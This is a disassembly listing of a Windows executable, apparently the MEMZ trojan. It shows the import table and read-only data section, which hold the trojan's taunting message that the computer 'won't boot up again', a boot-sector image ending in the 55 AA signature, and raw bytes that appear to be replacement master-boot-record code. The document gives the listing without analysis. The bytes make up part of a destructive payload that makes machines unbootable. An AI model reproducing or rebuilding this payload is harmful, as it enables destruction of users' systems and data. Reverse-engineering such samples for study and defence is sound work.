.text:00401C00
.idata:00402000 ; Section 2. (virtual address 00002000)
.idata:00402000 ; Virtual size                  : 00001B80 (   7040.)
.idata:00402000 ; Section size in file          : 00001C00 (   7168.)
.idata:00402000 ; Offset to raw data for section: 00001000
.idata:00402000 ; Flags 40000040: Data Readable
.idata:00402000 ; Alignment     : default
.idata:00402000 ;
.idata:00402000 ; Imports from ADVAPI32.dll
.idata:00402000 ;
.idata:00402000 ; ===========================================================================
.idata:00402000
.idata:00402000 ; Segment type: Externs
.idata:00402000 ; _idata
.idata:00402000 ; BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
.idata:00402000                 extrn OpenProcessToken:dword
.idata:00402000                                         ; CODE XREF: sub_401021+94↑p
.idata:00402000                                         ; DATA XREF: sub_401021+94↑r ...
.idata:00402000                                         ; ADVAPI32
.idata:00402004 ; BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength)
.idata:00402004                 extrn AdjustTokenPrivileges:dword
.idata:00402004                                         ; CODE XREF: sub_401021+C3↑p
.idata:00402004                                         ; DATA XREF: sub_401021+C3↑r
.idata:00402004                                         ; ADVAPI32
.idata:00402008 ; BOOL (__stdcall *LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid)
.idata:00402008                 extrn LookupPrivilegeValueA:dword
.idata:00402008                                         ; CODE XREF: sub_401021+A4↑p
.idata:00402008                                         ; DATA XREF: sub_401021+A4↑r
.idata:00402008                                         ; ADVAPI32
.idata:0040200C ; BOOL (__stdcall *CryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags)
.idata:0040200C                 extrn CryptAcquireContextA:dword
.idata:0040200C                                         ; CODE XREF: sub_401A37+1B↑p
.idata:0040200C                                         ; DATA XREF: sub_401A37+1B↑r
.idata:0040200C                                         ; ADVAPI32
.idata:00402010 ; BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer)
.idata:00402010                 extrn CryptGenRandom:dword
.idata:00402010                                         ; CODE XREF: sub_401A37+39↑p
.idata:00402010                                         ; DATA XREF: sub_401A37+39↑r
.idata:00402010                                         ; ADVAPI32
.idata:00402014
.idata:00402018 ;
.idata:00402018 ; Imports from GDI32.dll
.idata:00402018 ;
.idata:00402018 ; BOOL (__stdcall *BitBlt)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop)
.idata:00402018                 extrn BitBlt:dword      ; CODE XREF: sub_4015A2+3F↑p
.idata:00402018                                         ; sub_401694+9B↑p
.idata:00402018                                         ; DATA XREF: ...
.idata:00402018                                         ; GDI32
.idata:0040201C ; BOOL (__stdcall *StretchBlt)(HDC hdcDest, int xDest, int yDest, int wDest, int hDest, HDC hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, DWORD rop)
.idata:0040201C                 extrn StretchBlt:dword  ; CODE XREF: sub_4017B0+43↑p
.idata:0040201C                                         ; DATA XREF: sub_4017B0+43↑r
.idata:0040201C                                         ; GDI32
.idata:00402020
.idata:00402024 ;
.idata:00402024 ; Imports from KERNEL32.dll
.idata:00402024 ;
.idata:00402024 ; BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
.idata:00402024                 extrn WriteFile:dword   ; CODE XREF: start+168↑p
.idata:00402024                                         ; start+1BA↑p
.idata:00402024                                         ; DATA XREF: ...
.idata:00402024                                         ; KERNEL32
.idata:00402028 ; BOOL (__stdcall *CloseHandle)(HANDLE hObject)
.idata:00402028                 extrn CloseHandle:dword ; CODE XREF: sub_40114A+A8↑p
.idata:00402028                                         ; sub_40114A+C9↑p ...
.idata:00402028                                         ; KERNEL32
.idata:0040202C ; int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2)
.idata:0040202C                 extrn lstrcmpA:dword    ; CODE XREF: sub_40114A+9A↑p
.idata:0040202C                                         ; DATA XREF: sub_40114A+9A↑r
.idata:0040202C                                         ; KERNEL32
.idata:00402030 ; int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2)
.idata:00402030                 extrn lstrcmpW:dword    ; CODE XREF: start+45↑p
.idata:00402030                                         ; DATA XREF: start+45↑r
.idata:00402030                                         ; KERNEL32
.idata:00402034 ; HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName)
.idata:00402034                 extrn LoadLibraryA:dword
.idata:00402034                                         ; CODE XREF: sub_401021+3D↑p
.idata:00402034                                         ; DATA XREF: sub_401021+3D↑r
.idata:00402034                                         ; KERNEL32
.idata:00402038 ; DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
.idata:00402038                 extrn GetModuleFileNameA:dword
.idata:00402038                                         ; CODE XREF: start+235↑p
.idata:00402038                                         ; DATA XREF: start+235↑r
.idata:00402038                                         ; KERNEL32
.idata:0040203C ; LPWSTR (__stdcall *GetCommandLineW)()
.idata:0040203C                 extrn GetCommandLineW:dword
.idata:0040203C                                         ; CODE XREF: start+26↑p
.idata:0040203C                                         ; DATA XREF: start+26↑r
.idata:0040203C                                         ; KERNEL32
.idata:00402040 ; void (__stdcall *Sleep)(DWORD dwMilliseconds)
.idata:00402040                 extrn Sleep:dword       ; CODE XREF: sub_401021+1D↑p
.idata:00402040                                         ; sub_40114A:loc_40117F↑p ...
.idata:00402040                                         ; KERNEL32
.idata:00402044 ; BOOL (__stdcall *SetPriorityClass)(HANDLE hProcess, DWORD dwPriorityClass)
.idata:00402044                 extrn SetPriorityClass:dword
.idata:00402044                                         ; CODE XREF: start+291↑p
.idata:00402044                                         ; DATA XREF: start+291↑r
.idata:00402044                                         ; KERNEL32
.idata:00402048 ; HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID)
.idata:00402048                 extrn __imp_CreateToolhelp32Snapshot:dword
.idata:00402048                                         ; DATA XREF: CreateToolhelp32Snapshot↑r
.idata:00402048                                         ; KERNEL32
.idata:0040204C ; BOOL (__stdcall *Process32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
.idata:0040204C                 extrn __imp_Process32First:dword
.idata:0040204C                                         ; DATA XREF: Process32First↑r
.idata:0040204C                                         ; KERNEL32
.idata:00402050 ; BOOL (__stdcall *Process32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
.idata:00402050                 extrn __imp_Process32Next:dword
.idata:00402050                                         ; DATA XREF: Process32Next↑r
.idata:00402050                                         ; KERNEL32
.idata:00402054 ; HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes)
.idata:00402054                 extrn GlobalAlloc:dword ; CODE XREF: sub_401916+C↑p
.idata:00402054                                         ; DATA XREF: sub_401916+C↑r
.idata:00402054                                         ; KERNEL32
.idata:00402058 ; HGLOBAL (__stdcall *GlobalFree)(HGLOBAL hMem)
.idata:00402058                 extrn GlobalFree:dword  ; CODE XREF: sub_401916+39↑p
.idata:00402058                                         ; DATA XREF: sub_401916+39↑r
.idata:00402058                                         ; KERNEL32
.idata:0040205C ; int (__stdcall *lstrlenW)(LPCWSTR lpString)
.idata:0040205C                 extrn lstrlenW:dword    ; CODE XREF: sub_401A82+F↑p
.idata:0040205C                                         ; DATA XREF: sub_401A82+F↑r
.idata:0040205C                                         ; KERNEL32
.idata:00402060 ; DWORD (__stdcall *GetCurrentThreadId)()
.idata:00402060                 extrn GetCurrentThreadId:dword
.idata:00402060                                         ; CODE XREF: sub_401021+DE↑p
.idata:00402060                                         ; sub_401978+1↑p
.idata:00402060                                         ; DATA XREF: ...
.idata:00402060                                         ; KERNEL32
.idata:00402064 ; HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
.idata:00402064                 extrn CreateThread:dword
.idata:00402064                                         ; CODE XREF: sub_401021+15↑p
.idata:00402064                                         ; start+5D↑p ...
.idata:00402064                                         ; KERNEL32
.idata:00402068 ; void (__stdcall __noreturn *ExitProcess)(UINT uExitCode)
.idata:00402068                 extrn ExitProcess:dword ; CODE XREF: start:loc_40132B↑p
.idata:00402068                                         ; sub_401A37+27↑p
.idata:00402068                                         ; DATA XREF: ...
.idata:00402068                                         ; KERNEL32
.idata:0040206C ; HANDLE (__stdcall *GetCurrentProcess)()
.idata:0040206C                 extrn GetCurrentProcess:dword
.idata:0040206C                                         ; CODE XREF: sub_401021+8D↑p
.idata:0040206C                                         ; sub_40114A+24↑p
.idata:0040206C                                         ; DATA XREF: ...
.idata:0040206C                                         ; KERNEL32
.idata:00402070 ; HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
.idata:00402070                 extrn OpenProcess:dword ; CODE XREF: sub_40114A+6F↑p
.idata:00402070                                         ; DATA XREF: sub_40114A+6F↑r
.idata:00402070                                         ; KERNEL32
.idata:00402074 ; HLOCAL (__stdcall *LocalFree)(HLOCAL hMem)
.idata:00402074                 extrn LocalFree:dword   ; CODE XREF: sub_40114A+B1↑p
.idata:00402074                                         ; DATA XREF: sub_40114A+B1↑r
.idata:00402074                                         ; KERNEL32
.idata:00402078 ; HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes)
.idata:00402078                 extrn LocalAlloc:dword  ; CODE XREF: sub_40114A+19↑p
.idata:00402078                                         ; sub_40114A+7F↑p ...
.idata:00402078                                         ; KERNEL32
.idata:0040207C ; HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
.idata:0040207C                 extrn CreateFileA:dword ; CODE XREF: start+EC↑p
.idata:0040207C                                         ; start+194↑p
.idata:0040207C                                         ; DATA XREF: ...
.idata:0040207C                                         ; KERNEL32
.idata:00402080 ; FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
.idata:00402080                 extrn GetProcAddress:dword
.idata:00402080                                         ; CODE XREF: sub_401021+51↑p
.idata:00402080                                         ; sub_401021+5B↑p
.idata:00402080                                         ; DATA XREF: ...
.idata:00402080                                         ; KERNEL32
.idata:00402084
.idata:00402088 ;
.idata:00402088 ; Imports from PSAPI.DLL
.idata:00402088 ;
.idata:00402088                 extrn __imp_GetProcessImageFileNameA:dword
.idata:00402088                                         ; DATA XREF: GetProcessImageFileNameA↑r
.idata:00402088                                         ; .rdata:0040360C↓o
.idata:00402088                                         ; PSAPI
.idata:0040208C
.idata:00402090 ;
.idata:00402090 ; Imports from SHELL32.dll
.idata:00402090 ;
.idata:00402090 ; LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs)
.idata:00402090                 extrn CommandLineToArgvW:dword
.idata:00402090                                         ; CODE XREF: start+2D↑p
.idata:00402090                                         ; DATA XREF: start+2D↑r ...
.idata:00402090                                         ; SHELL32
.idata:00402094 ; HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd)
.idata:00402094                 extrn ShellExecuteA:dword ; CODE XREF: start+1DB↑p
.idata:00402094                                         ; start+249↑p ...
.idata:00402094                                         ; SHELL32
.idata:00402098 ; BOOL (__stdcall *ShellExecuteExA)(SHELLEXECUTEINFOA *pExecInfo)
.idata:00402098                 extrn ShellExecuteExA:dword
.idata:00402098                                         ; CODE XREF: start+283↑p
.idata:00402098                                         ; DATA XREF: start+283↑r
.idata:00402098                                         ; SHELL32
.idata:0040209C
.idata:004020A0 ;
.idata:004020A0 ; Imports from USER32.dll
.idata:004020A0 ;
.idata:004020A0 ; int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC)
.idata:004020A0                 extrn ReleaseDC:dword   ; CODE XREF: sub_4015A2+47↑p
.idata:004020A0                                         ; sub_401694+A5↑p ...
.idata:004020A0                                         ; USER32
.idata:004020A4 ; BOOL (__stdcall *GetWindowRect)(HWND hWnd, LPRECT lpRect)
.idata:004020A4                 extrn GetWindowRect:dword
.idata:004020A4                                         ; CODE XREF: sub_4015A2+1E↑p
.idata:004020A4                                         ; sub_401694+23↑p ...
.idata:004020A4                                         ; USER32
.idata:004020A8 ; int (__stdcall *MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
.idata:004020A8                 extrn MessageBoxW:dword ; CODE XREF: sub_401978+2A↑p
.idata:004020A8                                         ; DATA XREF: sub_401978+2A↑r
.idata:004020A8                                         ; USER32
.idata:004020AC ; BOOL (__stdcall *SetCursorPos)(int X, int Y)
.idata:004020AC                 extrn SetCursorPos:dword
.idata:004020AC                                         ; CODE XREF: sub_40153B+57↑p
.idata:004020AC                                         ; DATA XREF: sub_40153B+57↑r
.idata:004020AC                                         ; USER32
.idata:004020B0 ; BOOL (__stdcall *GetCursorPos)(LPPOINT lpPoint)
.idata:004020B0                 extrn GetCursorPos:dword
.idata:004020B0                                         ; CODE XREF: sub_40153B+C↑p
.idata:004020B0                                         ; sub_40182D+3B↑p
.idata:004020B0                                         ; DATA XREF: ...
.idata:004020B0                                         ; USER32
.idata:004020B4 ; HWND (__stdcall *GetDesktopWindow)()
.idata:004020B4                 extrn GetDesktopWindow:dword
.idata:004020B4                                         ; CODE XREF: sub_4015A2+8↑p
.idata:004020B4                                         ; sub_401694+9↑p ...
.idata:004020B4                                         ; USER32
.idata:004020B8 ; BOOL (__stdcall *EnumWindows)(WNDENUMPROC lpEnumFunc, LPARAM lParam)
.idata:004020B8                 extrn EnumWindows:dword ; CODE XREF: sub_401656+7↑p
.idata:004020B8                                         ; DATA XREF: sub_401656+7↑r
.idata:004020B8                                         ; USER32
.idata:004020BC ; HWND (__stdcall *GetWindow)(HWND hWnd, UINT uCmd)
.idata:004020BC                 extrn GetWindow:dword   ; CODE XREF: sub_401916:loc_40196C↑p
.idata:004020BC                                         ; DATA XREF: sub_401916+3F↑r
.idata:004020BC                                         ; USER32
.idata:004020C0 ; LRESULT (__stdcall *CallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam)
.idata:004020C0                 extrn CallNextHookEx:dword ; CODE XREF: fn+4F↑p
.idata:004020C0                                         ; DATA XREF: fn+4F↑r
.idata:004020C0                                         ; USER32
.idata:004020C4 ; HDC (__stdcall *GetWindowDC)(HWND hWnd)
.idata:004020C4                 extrn GetWindowDC:dword ; CODE XREF: sub_4015A2+11↑p
.idata:004020C4                                         ; sub_401694+15↑p ...
.idata:004020C4                                         ; USER32
.idata:004020C8 ; BOOL (__stdcall *UnhookWindowsHookEx)(HHOOK hhk)
.idata:004020C8                 extrn UnhookWindowsHookEx:dword
.idata:004020C8                                         ; CODE XREF: sub_401021+11D↑p
.idata:004020C8                                         ; sub_401978+31↑p
.idata:004020C8                                         ; DATA XREF: ...
.idata:004020C8                                         ; USER32
.idata:004020CC ; int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
.idata:004020CC                 extrn MessageBoxA:dword ; CODE XREF: sub_401021+116↑p
.idata:004020CC                                         ; DATA XREF: sub_401021+116↑r
.idata:004020CC                                         ; USER32
.idata:004020D0 ; int (__stdcall *GetSystemMetrics)(int nIndex)
.idata:004020D0                 extrn GetSystemMetrics:dword
.idata:004020D0                                         ; CODE XREF: start+12↑p
.idata:004020D0                                         ; start+1B↑p ...
.idata:004020D0                                         ; USER32
.idata:004020D4 ; HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
.idata:004020D4                 extrn CreateWindowExA:dword
.idata:004020D4                                         ; CODE XREF: start+AC↑p
.idata:004020D4                                         ; DATA XREF: start+AC↑r
.idata:004020D4                                         ; USER32
.idata:004020D8 ; ATOM (__stdcall *RegisterClassExA)(const WNDCLASSEXA *)
.idata:004020D8                 extrn RegisterClassExA:dword
.idata:004020D8                                         ; CODE XREF: start+98↑p
.idata:004020D8                                         ; DATA XREF: start+98↑r
.idata:004020D8                                         ; USER32
.idata:004020DC ; LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
.idata:004020DC                 extrn DefWindowProcA:dword
.idata:004020DC                                         ; DATA XREF: sub_401000+10↑r
.idata:004020DC                                         ; USER32
.idata:004020E0 ; BOOL (__stdcall *ExitWindowsEx)(UINT uFlags, DWORD dwReason)
.idata:004020E0                 extrn ExitWindowsEx:dword
.idata:004020E0                                         ; CODE XREF: sub_401021+D0↑p
.idata:004020E0                                         ; DATA XREF: sub_401021+D0↑r
.idata:004020E0                                         ; USER32
.idata:004020E4 ; LRESULT (__stdcall *DispatchMessageA)(const MSG *lpMsg)
.idata:004020E4                 extrn DispatchMessageA:dword
.idata:004020E4                                         ; CODE XREF: start+C8↑p
.idata:004020E4                                         ; DATA XREF: start+C8↑r
.idata:004020E4                                         ; USER32
.idata:004020E8 ; BOOL (__stdcall *TranslateMessage)(const MSG *lpMsg)
.idata:004020E8                 extrn TranslateMessage:dword
.idata:004020E8                                         ; CODE XREF: start+BE↑p
.idata:004020E8                                         ; DATA XREF: start+BE↑r
.idata:004020E8                                         ; USER32
.idata:004020EC ; BOOL (__stdcall *DrawIcon)(HDC hDC, int X, int Y, HICON hIcon)
.idata:004020EC                 extrn DrawIcon:dword    ; CODE XREF: sub_40182D+62↑p
.idata:004020EC                                         ; sub_40182D+C0↑p
.idata:004020EC                                         ; DATA XREF: ...
.idata:004020EC                                         ; USER32
.idata:004020F0 ; UINT (__stdcall *SendInput)(UINT cInputs, LPINPUT pInputs, int cbSize)
.idata:004020F0                 extrn SendInput:dword   ; CODE XREF: sub_40176C+27↑p
.idata:004020F0                                         ; DATA XREF: sub_40176C+27↑r
.idata:004020F0                                         ; USER32
.idata:004020F4 ; HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName)
.idata:004020F4                 extrn LoadIconA:dword   ; CODE XREF: sub_40182D+48↑p
.idata:004020F4                                         ; sub_40182D+9E↑p
.idata:004020F4                                         ; DATA XREF: ...
.idata:004020F4                                         ; USER32
.idata:004020F8 ; LRESULT (__stdcall *SendMessageW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
.idata:004020F8                 extrn SendMessageW:dword
.idata:004020F8                                         ; CODE XREF: sub_401916+25↑p
.idata:004020F8                                         ; sub_401916+36↑p
.idata:004020F8                                         ; DATA XREF: ...
.idata:004020F8                                         ; USER32
.idata:004020FC ; BOOL (__stdcall *GetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
.idata:004020FC                 extrn GetMessageA:dword ; CODE XREF: start+D5↑p
.idata:004020FC                                         ; DATA XREF: start+B2↑r
.idata:004020FC                                         ; USER32
.idata:00402100 ; HHOOK (__stdcall *SetWindowsHookExA)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId)
.idata:00402100                 extrn SetWindowsHookExA:dword
.idata:00402100                                         ; CODE XREF: sub_401021+EE↑p
.idata:00402100                                         ; sub_401978+11↑p
.idata:00402100                                         ; DATA XREF: ...
.idata:00402100                                         ; USER32
.idata:00402104
.idata:00402108 ;
.idata:00402108 ; Imports from WINMM.dll
.idata:00402108 ;
.idata:00402108 ; BOOL (__stdcall *PlaySoundA)(LPCSTR pszSound, HMODULE hmod, DWORD fdwSound)
.idata:00402108                 extrn PlaySoundA:dword  ; CODE XREF: sub_401667+18↑p
.idata:00402108                                         ; DATA XREF: sub_401667+18↑r ...
.idata:00402108                                         ; WINMM
.idata:0040210C
.idata:0040210C
.rdata:00402110 ; ===========================================================================
.rdata:00402110
.rdata:00402110 ; Segment type: Pure data
.rdata:00402110 ; Segment permissions: Read
.rdata:00402110 _rdata          segment para public 'DATA' use32
.rdata:00402110                 assume cs:_rdata
.rdata:00402110                 ;org 402110h
.rdata:00402110 aYourComputerHa db 'YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.',0Dh,0Ah
.rdata:00402110                                         ; DATA XREF: start+1B4↑o
.rdata:00402143                 db 0Dh,0Ah
.rdata:00402145                 db 'Your computer won',27h,'t boot up again,',0Dh,0Ah
.rdata:00402169                 db 'so use it as long as you can!',0Dh,0Ah
.rdata:00402188                 db 0Dh,0Ah
.rdata:0040218A                 db ':D',0Dh,0Ah
.rdata:0040218E                 db 0Dh,0Ah
.rdata:00402190                 db 'Trying to kill MEMZ will cause your system to be',0Dh,0Ah
.rdata:004021C2                 db 'destroyed instantly, so don',27h,'t try it :D',0
.rdata:004021EA                 align 4
.rdata:004021EC dword_4021EC    dd 22h                  ; DATA XREF: sub_4014CA+12↑r
.rdata:004021F0 dword_4021F0    dd 3                    ; DATA XREF: sub_401667+B↑r
.rdata:004021F4 dword_4021F4    dd 14h                  ; DATA XREF: sub_401021+107↑r
.rdata:004021F8 ; _BYTE byte_4021F8[304]
.rdata:004021F8 byte_4021F8     db 0BBh, 0E0h, 7, 8Eh, 0C3h, 8Eh, 0DBh, 0B8h, 4, 2, 0B9h
.rdata:004021F8                                         ; DATA XREF: start+11D↑o
.rdata:00402203                 db 2, 0, 0B6h, 0, 0BBh, 2 dup(0), 0CDh, 13h, 31h, 0C0h
.rdata:0040220E                 db 89h, 0C3h, 89h, 0C1h, 89h, 0C2h, 0BEh, 2 dup(0), 0BFh
.rdata:00402218                 db 0, 40h, 0ACh, 81h, 0FEh, 9Eh, 7, 73h, 35h, 3Ch, 80h
.rdata:00402223                 db 73h, 3, 0E9h, 10h, 0, 24h, 7Fh, 88h, 0C1h, 0ACh, 0AAh
.rdata:0040222E                 db 0FEh, 0C9h, 80h, 0F9h, 0FFh, 75h, 0F7h, 0E9h, 0E2h
.rdata:00402237                 db 0FFh, 88h, 0C4h, 0ACh, 89h, 0C3h, 0ACh, 89h, 0F2h, 89h
.rdata:00402241                 db 0DEh, 81h, 0C6h, 0, 40h, 88h, 0C1h, 0ACh, 0AAh, 0FEh
.rdata:0040224B                 db 0C9h, 80h, 0F9h, 0, 75h, 0F7h, 89h, 0D6h, 0E9h, 0C4h
.rdata:00402255                 db 0FFh, 0B0h, 0B6h, 0E6h, 43h, 0B8h, 3, 10h, 0B3h, 0
.rdata:0040225F                 db 0CDh, 10h, 0BFh, 2 dup(0), 0BAh, 0C0h, 9Dh, 0B9h, 0
.rdata:00402269                 db 0B8h, 8Eh, 0C1h, 0B8h, 2 dup(0), 0B9h, 0D0h, 7, 0F3h
.rdata:00402273                 db 0ABh, 0BEh, 9Ch, 9Fh, 0BFh, 2 dup(0), 0E4h, 61h, 0Ch
.rdata:0040227D                 db 3, 0E6h, 61h, 0B3h, 1, 52h, 0B4h, 86h, 0B9h, 2 dup(0)
.rdata:00402288                 db 0BAh, 0, 60h, 0CDh, 15h, 5Ah, 81h, 0FEh, 0E8h, 9Fh
.rdata:00402292                 db 7Dh, 4, 0ACh, 0B4h, 0F0h, 0ABh, 0FEh, 0CBh, 80h, 0FBh
.rdata:0040229C                 db 0, 75h, 0E3h, 56h, 89h, 0D6h, 0ADh, 89h, 0C1h, 80h
.rdata:004022A6                 db 0E4h, 1Fh, 0E6h, 42h, 88h, 0E0h, 0E6h, 42h, 0C0h, 0EDh
.rdata:004022B0                 db 5, 0C0h, 0E5h, 2, 88h, 0EBh, 89h, 0F2h, 5Eh, 81h, 0FAh
.rdata:004022BB                 db 0F4h, 9Dh, 75h, 0C3h, 0BEh, 0, 40h, 0BFh, 2 dup(0)
.rdata:004022C5                 db 0B8h, 0E0h, 7, 8Eh, 0D8h, 0B8h, 0, 0B8h, 8Eh, 0C0h
.rdata:004022CF                 db 0FEh, 0CBh, 0E9h, 20h, 0, 0B0h, 0DCh, 0AAh, 0ACh, 0AAh
.rdata:004022D9                 db 81h, 0FEh, 0C0h, 9Dh, 74h, 42h, 81h, 0FFh, 0A0h, 0Fh
.rdata:004022E3                 db 74h, 3, 0E9h, 0ECh, 0FFh, 52h, 0B4h, 86h, 0B9h, 1, 0
.rdata:004022EE                 db 0BAh, 0, 60h, 0CDh, 15h, 5Ah, 0BFh, 2 dup(0), 81h, 0FAh
.rdata:004022F9                 db 9Ch, 9Fh, 75h, 3, 0BAh, 0F4h, 9Dh, 0FEh, 0CBh, 80h
.rdata:00402303                 db 0FBh, 0, 75h, 0CDh, 56h, 89h, 0D6h, 0ADh, 89h, 0C1h
.rdata:0040230D                 db 80h, 0E4h, 1Fh, 0E6h, 42h, 88h, 0E0h, 0E6h, 42h, 0C0h
.rdata:00402317                 db 0EDh, 5, 88h, 0EBh, 89h, 0F2h, 5Eh, 0E9h, 0B3h, 0FFh
.rdata:00402321                 db 0BEh, 0, 40h, 0E9h, 0C1h, 0FFh, 0
.rdata:00402328 ; char byte_402328[1952]
.rdata:00402328 byte_402328     db 55h                  ; DATA XREF: start:loc_40136C↑r
.rdata:00402329                 db 0AAh
.rdata:0040232A                 db  83h
.rdata:0040232B                 db  11h
.rdata:0040232C                 db  11h
.rdata:0040232D                 db  11h
.rdata:0040232E                 db  11h
.rdata:0040232F                 db    0
.rdata:00402330                 db    0
.rdata:00402331                 db    4
.rdata:00402332                 db    0
.rdata:00402333                 db    0
.rdata:00402334                 db    8
.rdata:00402335                 db    0
.rdata:00402336                 db    0
.rdata:00402337                 db  10h
.rdata:00402338                 db    0
.rdata:00402339                 db    0
.rdata:0040233A                 db  20h
.rdata:0040233B                 db    0
.rdata:0040233C                 db  35h ; 5
.rdata:0040233D                 db  0Bh
.rdata:0040233E                 db  83h
.rdata:0040233F                 db 0F1h
.rdata:00402340                 db 0F1h
.rdata:00402341                 db  11h
.rdata:00402342                 db 0F1h
.rdata:00402343                 db    0
.rdata:00402344                 db    0
.rdata:00402345                 db  4Bh ; K
.rdata:00402346                 db    0
.rdata:00402347                 db  96h
.rdata:00402348                 db    4
.rdata:00402349                 db  80h
.rdata:0040234A                 db 0FFh
.rdata:0040234B                 db    0
.rdata:0040234C                 db  4Fh ; O
.rdata:0040234D                 db  4Fh ; O
.rdata:0040234E                 db    0
.rdata:0040234F                 db  9Fh
.rdata:00402350                 db  4Fh ; O
.rdata:00402351                 db    0
.rdata:00402352                 db 0EAh
.rdata:00402353                 db  53h ; S
.rdata:00402354                 db  82h
.rdata:00402355                 db  1Fh
.rdata:00402356                 db 0F1h
.rdata:00402357                 db  1Fh
.rdata:00402358                 db    1
.rdata:00402359                 db  42h ; B
.rdata:0040235A                 db  4Eh ; N
.rdata:0040235B                 db    0
.rdata:0040235C                 db  4Eh ; N
.rdata:0040235D                 db  50h ; P
.rdata:0040235E                 db    2
.rdata:0040235F                 db  12h
.rdata:00402360                 db  1Fh
.rdata:00402361                 db  83h
.rdata:00402362                 db  10h
.rdata:00402363                 db  10h
.rdata:00402364                 db  10h
.rdata:00402365                 db  10h
.rdata:00402366                 db    2
.rdata:00402367                 db  50h ; P
.rdata:00402368                 db    4
.rdata:00402369                 db    2
.rdata:0040236A                 db  50h ; P
.rdata:0040236B                 db    8
.rdata:0040236C                 db  80h
.rdata:0040236D                 db  10h
.rdata:0040236E                 db    2
.rdata:0040236F                 db  31h ; 1
.rdata:00402370                 db  1Fh
.rdata:00402371                 db  83h
.rdata:00402372                 db  14h
.rdata:00402373                 db  14h
.rdata:00402374                 db  14h
.rdata:00402375                 db  14h
.rdata:00402376                 db    2
.rdata:00402377                 db  80h
.rdata:00402378                 db    4
.rdata:00402379                 db  83h
.rdata:0040237A                 db  44h ; D
.rdata:0040237B                 db  44h ; D
.rdata:0040237C                 db  44h ; D
.rdata:0040237D                 db  44h ; D
.rdata:0040237E                 db    2
.rdata:0040237F                 db  88h
.rdata:00402380                 db    4
.rdata:00402381                 db    2
.rdata:00402382                 db  80h
.rdata:00402383                 db  0Eh
.rdata:00402384                 db  87h
.rdata:00402385                 db  40h ; @
.rdata:00402386                 db  0Eh
.rdata:00402387                 db 0EEh
.rdata:00402388                 db 0EEh
.rdata:00402389                 db 0EDh
.rdata:0040238A                 db 0EDh
.rdata:0040238B                 db 0EDh
.rdata:0040238C                 db 0EDh
.rdata:0040238D                 db    2
.rdata:0040238E                 db 0A2h
.rdata:0040238F                 db    4
.rdata:00402390                 db    2
.rdata:00402391                 db 0A5h
.rdata:00402392                 db    5
.rdata:00402393                 db  82h
.rdata:00402394                 db 0EEh
.rdata:00402395                 db 0EEh
.rdata:00402396                 db  0Eh
.rdata:00402397                 db    2
.rdata:00402398                 db  60h ; `
.rdata:00402399                 db  1Eh
.rdata:0040239A                 db    2
.rdata:0040239B                 db  88h
.rdata:0040239C                 db    8
.rdata:0040239D                 db  83h
.rdata:0040239E                 db  46h ; F
.rdata:0040239F                 db  46h ; F
.rdata:004023A0                 db  46h ; F
.rdata:004023A1                 db  46h ; F
.rdata:004023A2                 db    2
.rdata:004023A3                 db 0D8h
.rdata:004023A4                 db    4
.rdata:004023A5                 db    2
.rdata:004023A6                 db 0D0h
.rdata:004023A7                 db  0Eh
